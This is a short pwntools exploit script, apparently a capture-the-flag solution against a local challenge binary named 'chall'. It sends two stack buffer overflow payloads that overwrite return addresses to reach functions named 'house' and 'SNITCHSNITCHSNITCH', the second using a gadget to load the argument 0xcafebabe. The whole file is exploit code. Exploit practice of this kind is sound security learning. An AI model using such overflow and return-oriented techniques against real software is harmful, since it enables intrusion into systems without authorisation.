from pwn import *

io = process("./chall")
e = ELF("./chall")

payload = b"A"*0x18 + p64(e.sym["house"])

io.sendlineafter(b"house...", payload)

payload = b"A"*0x18 + p64(0x0000000000401166) + p64(0xcafebabe)
payload += p64(e.sym["SNITCHSNITCHSNITCH"])

io.sendlineafter(b"SNITCH", payload)

io.interactive()

